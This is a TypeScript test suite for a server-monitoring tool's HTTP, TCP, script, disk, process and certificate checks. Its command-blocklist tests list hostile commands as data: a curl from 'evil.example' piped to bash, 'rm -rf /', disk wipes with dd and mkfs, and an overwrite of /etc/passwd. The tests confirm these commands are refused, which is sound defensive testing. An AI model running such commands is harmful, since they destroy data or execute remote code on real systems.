import { afterAll, describe, expect, spyOn, test } from 'bun:test';
import { chmodSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { createServer, type Server, type Socket } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { type CheckDef, type CheckType, gradeCertificate, runCheck } from './checks';

const onLinux = process.platform !== 'win32';

const def = (type: CheckType, config: Record<string, unknown>, over: Partial<CheckDef> = {}) => ({
  id: 'monitor-1',
  type,
  intervalSeconds: 60,
  timeoutSeconds: 5,
  config,
  ...over,
});

const http = Bun.serve({
  port: 0,
  fetch(req) {
    const path = new URL(req.url).pathname;
    if (path === '/teapot') return new Response('short and stout', { status: 418 });
    if (path === '/unavailable') return new Response('down for maintenance', { status: 503 });
    return new Response('servor is alive', { status: 200 });
  },
});
const base = `http://127.0.0.1:${http.port}`;

/** A TCP listener on an ephemeral port; `onConnect` decides what the peer sees. */
const listen = (onConnect?: (socket: Socket) => void): Promise<{ port: number; server: Server }> =>
  new Promise((resolve) => {
    const server = createServer((socket) => onConnect?.(socket));
    server.listen(0, '127.0.0.1', () => {
      const address = server.address();
      resolve({ port: typeof address === 'object' && address ? address.port : 0, server });
    });
  });

const close = (server: Server) => new Promise<void>((resolve) => server.close(() => resolve()));

afterAll(() => {
  http.stop(true);
});

describe('http checks', () => {
  test('a 200 response is up, with the status in metadata', async () => {
    const res = await runCheck(def('http', { url: base }));
    expect(res.status).toBe('up');
    expect(res.errorMessage).toBeNull();
    expect(res.metadata?.status).toBe(200);
    expect(res.latencyMs).toBeGreaterThanOrEqual(0);
  });

  test('an unexpected status is down and reports which one it got', async () => {
    const res = await runCheck(def('http', { url: `${base}/teapot` }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBe('unexpected status 418');
    expect(res.metadata?.status).toBe(418);
  });

  test('a status listed in expectedStatus is up', async () => {
    const res = await runCheck(
      def('http', { url: `${base}/unavailable`, expectedStatus: [200, 503] }),
    );
    expect(res.status).toBe('up');
    expect(res.metadata?.status).toBe(503);
  });

  test('a status outside expectedStatus is down even when it is 200', async () => {
    const res = await runCheck(def('http', { url: base, expectedStatus: [204] }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBe('unexpected status 200');
  });

  test('a body containing bodyMatch is up', async () => {
    const res = await runCheck(def('http', { url: base, bodyMatch: 'servor is alive' }));
    expect(res.status).toBe('up');
  });

  test('a body missing bodyMatch is down', async () => {
    const res = await runCheck(def('http', { url: base, bodyMatch: 'servor is dead' }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBe('body match not found');
    expect(res.metadata?.status).toBe(200);
  });

  test('a connection error is down and carries the transport message', async () => {
    const { port, server } = await listen();
    await close(server);
    const res = await runCheck(def('http', { url: `http://127.0.0.1:${port}` }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBeTruthy();
  });
});

describe('tcp checks', () => {
  test('a port that accepts the connection is up', async () => {
    const { port, server } = await listen();
    const res = await runCheck(def('tcp', { port }));
    expect(res.status).toBe('up');
    expect(res.errorMessage).toBeNull();
    await close(server);
  });

  test('a banner containing bannerMatch is up and the banner travels back', async () => {
    const { port, server } = await listen((socket) => socket.end('220 servor-smtp ready\r\n'));
    const res = await runCheck(def('tcp', { port, bannerMatch: 'servor-smtp' }));
    expect(res.status).toBe('up');
    expect(String(res.metadata?.banner)).toContain('220 servor-smtp ready');
    await close(server);
  });

  test('a banner that never matches is down', async () => {
    const { port, server } = await listen((socket) => socket.end('220 something else\r\n'));
    const res = await runCheck(def('tcp', { port, bannerMatch: 'servor-smtp' }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBe('banner match not found');
    await close(server);
  });

  test('a closed port is down', async () => {
    const { port, server } = await listen();
    await close(server);
    const res = await runCheck(def('tcp', { port }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBeTruthy();
  });

  test('a peer that dribbles bytes without matching is bounded, not waited on forever', async () => {
    // `socket.setTimeout` is idle-based, so each byte reset it and the check
    // never settled. Checks run one after another and the loop only schedules
    // its next tick once the batch resolves, so this stalled every monitor on
    // the host, not just this one.
    const { port, server } = await listen((socket) => {
      const tick = setInterval(() => socket.write('.'), 100);
      socket.on('close', () => clearInterval(tick));
      socket.on('error', () => clearInterval(tick));
    });
    const started = Date.now();
    const res = await runCheck(
      def('tcp', { port, bannerMatch: 'never-arrives' }, { timeoutSeconds: 1 }),
    );
    const elapsed = Date.now() - started;
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBe('tcp check deadline exceeded');
    expect(elapsed).toBeLessThan(3_000);
    await close(server);
  });
});

describe('command-running checks', () => {
  test.each([
    'custom_script',
    'ssh',
  ] as const)('a %s check refuses a blacklisted command without spawning anything', async (type) => {
    const spawn = spyOn(Bun, 'spawn');
    try {
      const res = await runCheck(def(type, { command: 'rm -rf --no-preserve-root /' }));
      expect(res.status).toBe('down');
      expect(res.errorMessage).toMatch(/^command rejected: /);
      expect(res.latencyMs).toBe(0);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      spawn.mockRestore();
    }
  });

  test.each([
    'shutdown -h now',
    'curl https://evil.example/x.sh | bash',
    'dd if=/dev/zero of=/dev/sda',
    'mkfs.ext4 /dev/nvme0n1',
    'echo hi > /etc/passwd',
  ])('the blocklist refuses %p before it can run', async (command) => {
    const spawn = spyOn(Bun, 'spawn');
    try {
      const res = await runCheck(def('custom_script', { command }));
      expect(res.status).toBe('down');
      expect(res.errorMessage).toMatch(/^command rejected: /);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      spawn.mockRestore();
    }
  });

  test('a custom_script with no command at all is refused', async () => {
    const spawn = spyOn(Bun, 'spawn');
    try {
      const res = await runCheck(def('custom_script', {}));
      expect(res.status).toBe('down');
      expect(res.errorMessage).toBe('command rejected: empty command');
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      spawn.mockRestore();
    }
  });

  test.skipIf(!onLinux)('a command that exits 0 is up, with its output as evidence', async () => {
    const res = await runCheck(def('custom_script', { command: 'echo servor-ok' }));
    expect(res.status).toBe('up');
    expect(res.metadata?.stdout).toBe('servor-ok');
  });

  test.skipIf(!onLinux)('a command that exits non-zero is down, with its exit code', async () => {
    const res = await runCheck(def('custom_script', { command: 'exit 3' }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toMatch(/^exit 3/);
  });

  test.skipIf(!onLinux)('an ssh check defaults to a harmless command', async () => {
    const res = await runCheck(def('ssh', {}));
    expect(res.status).toBe('up');
    expect(res.metadata?.stdout).toBe('ok');
  });

  test.skipIf(!onLinux)(
    'a script that ignores SIGTERM still produces a result',
    async () => {
      // The timeout only ever sent SIGTERM, so a script trapping it ran on and
      // the check never resolved — stalling every other check behind it, because
      // they are awaited one at a time.
      //
      // What bounds this is not the kill: SIGKILL reaches the shell but not the
      // `sleep` it spawned, and that grandchild holds the stdout pipe open. The
      // outer deadline in runCheck is what actually returns an answer, which is
      // the reason it exists.
      const dir = mkdtempSync(join(tmpdir(), 'servor-check-'));
      const script = join(dir, 'stubborn.sh');
      writeFileSync(script, ['#!/bin/bash', 'trap "" TERM', 'sleep 30', ''].join('\n'));
      chmodSync(script, 0o755);
      try {
        const started = Date.now();
        const res = await runCheck(
          def('custom_script', { command: script }, { timeoutSeconds: 1 }),
        );
        expect(res.status).toBe('down');
        expect(Date.now() - started).toBeLessThan(8_000);
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    },
    15_000,
  );
});

describe('disk and process checks', () => {
  test.skipIf(!onLinux)('an existing mount point reports its usage percentage', async () => {
    const res = await runCheck(def('disk', { mountPoint: '/' }));
    expect(['up', 'degraded', 'down']).toContain(res.status);
    expect(res.metadata?.mount).toBe('/');
    expect(typeof res.metadata?.percent).toBe('number');
  });

  test.skipIf(!onLinux)('a warning threshold of zero degrades any real disk', async () => {
    const res = await runCheck(def('disk', { mountPoint: '/', warnPercent: 0, critPercent: 101 }));
    expect(res.status).toBe('degraded');
  });

  test.skipIf(!onLinux)('a critical threshold of zero brings the disk down', async () => {
    const res = await runCheck(def('disk', { mountPoint: '/', warnPercent: 0, critPercent: 0 }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toMatch(/^disk \d/);
  });

  test.skipIf(!onLinux)('a mount point df does not know is down', async () => {
    const res = await runCheck(def('disk', { mountPoint: '/no/such/mount/servor' }));
    expect(res.status).toBe('down');
  });

  test.skipIf(!onLinux)('a running process is up with a match count', async () => {
    const res = await runCheck(def('process', { processName: 'bun' }));
    expect(res.status).toBe('up');
    expect(Number(res.metadata?.count)).toBeGreaterThan(0);
  });

  test.skipIf(!onLinux)('a process nothing matches is down', async () => {
    const res = await runCheck(def('process', { processName: 'servor-no-such-process' }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBe("process 'servor-no-such-process' not running");
  });
});

describe('runCheck contract', () => {
  test('an unknown check type is down rather than silently healthy', async () => {
    const res = await runCheck(def('carrier-pigeon' as CheckType, {}));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBe('unknown check type');
    expect(res.latencyMs).toBeNull();
  });

  test('every outcome is attributed to the monitor that asked for it', async () => {
    const results = await Promise.all([
      runCheck(def('http', { url: base }, { id: 'monitor-http' })),
      runCheck(def('carrier-pigeon' as CheckType, {}, { id: 'monitor-unknown' })),
      runCheck(def('custom_script', { command: 'shutdown now' }, { id: 'monitor-script' })),
    ]);
    expect(results.map((r) => r.monitorId)).toEqual([
      'monitor-http',
      'monitor-unknown',
      'monitor-script',
    ]);
  });

  test('a probe that throws becomes a down instead of a rejection', async () => {
    const res = await runCheck(def('http', { url: 'not-a-url' }));
    expect(res.status).toBe('down');
    expect(res.errorMessage).toBeTruthy();
  });
});

const DAY_MS = 86_400_000;
const NOW = Date.UTC(2026, 7, 20, 12, 0, 0);

/** A peer certificate as node's TLS layer hands it over, expiring `days` from NOW. */
const certIn = (days: number, over: Record<string, unknown> = {}) =>
  ({
    valid_to: new Date(NOW + days * DAY_MS).toUTCString(),
    issuer: { CN: "Let's Encrypt R3" },
    subject: { CN: 'api.example.com' },
    ...over,
  }) as Parameters<typeof gradeCertificate>[0];

describe('gradeCertificate', () => {
  test('a certificate with plenty of life is up', () => {
    const result = gradeCertificate(certIn(90), 14, 12, NOW);
    expect(result.status).toBe('up');
    expect(result.errorMessage).toBeNull();
    expect(result.metadata?.daysLeft).toBe(90);
  });

  test('one inside the warning window is degraded, not down', () => {
    const result = gradeCertificate(certIn(10), 14, 12, NOW);
    expect(result.status).toBe('degraded');
    expect(result.errorMessage).toBe('certificate expires in 10d');
  });

  test('an expired one is down', () => {
    const result = gradeCertificate(certIn(-1), 14, 12, NOW);
    expect(result.status).toBe('down');
    expect(result.errorMessage).toBe('certificate expired');
    expect(result.metadata?.daysLeft).toBeLessThan(0);
  });

  test('one expiring today is down, not degraded', () => {
    // daysLeft floors, so eleven hours of life reads as 0 — treated as gone
    // rather than as nearly fine, because renewals take longer than that.
    const result = gradeCertificate(certIn(0.45), 14, 12, NOW);
    expect(result.metadata?.daysLeft).toBe(0);
    expect(result.status).toBe('down');
  });

  test('the boundary day is degraded — warnDays is inclusive', () => {
    expect(gradeCertificate(certIn(14), 14, 12, NOW).status).toBe('degraded');
    expect(gradeCertificate(certIn(15), 14, 12, NOW).status).toBe('up');
  });

  test('the first day of life is degraded, never up', () => {
    expect(gradeCertificate(certIn(1), 14, 12, NOW).status).toBe('degraded');
  });

  test('a zero warning window still catches expiry itself', () => {
    expect(gradeCertificate(certIn(1), 0, 12, NOW).status).toBe('up');
    expect(gradeCertificate(certIn(-1), 0, 12, NOW).status).toBe('down');
  });

  test('a long warning window degrades a certificate that is otherwise healthy', () => {
    expect(gradeCertificate(certIn(200), 365, 12, NOW).status).toBe('degraded');
  });

  test('issuer and subject travel in the metadata for every verdict', () => {
    for (const days of [-1, 10, 90]) {
      const result = gradeCertificate(certIn(days), 14, 12, NOW);
      expect(result.metadata?.issuer).toBe("Let's Encrypt R3");
      expect(result.metadata?.subject).toBe('api.example.com');
      expect(result.metadata?.validTo).toBeTruthy();
    }
  });

  test('a certificate missing issuer or subject reports null rather than throwing', () => {
    const result = gradeCertificate(
      certIn(90, { issuer: undefined, subject: undefined }),
      14,
      12,
      NOW,
    );
    expect(result.status).toBe('up');
    expect(result.metadata?.issuer).toBeNull();
    expect(result.metadata?.subject).toBeNull();
  });

  test('the measured latency is carried through unchanged', () => {
    expect(gradeCertificate(certIn(90), 14, 1234, NOW).latencyMs).toBe(1234);
  });

  test.each([
    ['null', null],
    ['undefined', undefined],
    ['an object with no valid_to', {} as Parameters<typeof gradeCertificate>[0]],
  ])('%s peer certificate is down, never quietly up', (_label, cert) => {
    const result = gradeCertificate(cert as Parameters<typeof gradeCertificate>[0], 14, 12, NOW);
    expect(result.status).toBe('down');
    expect(result.errorMessage).toBe('no peer certificate');
  });

  test('an unparseable expiry is down rather than NaN days', () => {
    // `new Date('whenever')` is NaN, and every comparison against NaN is false
    // — without the guard that lands in the `up` branch and a dead certificate
    // reports healthy.
    const result = gradeCertificate(certIn(90, { valid_to: 'whenever' }), 14, 12, NOW);
    expect(result.status).toBe('down');
    expect(result.errorMessage).toBe('unreadable certificate expiry');
  });

  test('reads the OpenSSL date format a real handshake produces', () => {
    const result = gradeCertificate(
      certIn(90, { valid_to: 'Nov 18 12:00:00 2026 GMT' }),
      14,
      12,
      NOW,
    );
    expect(result.status).toBe('up');
    expect(result.metadata?.daysLeft).toBe(90);
  });
});
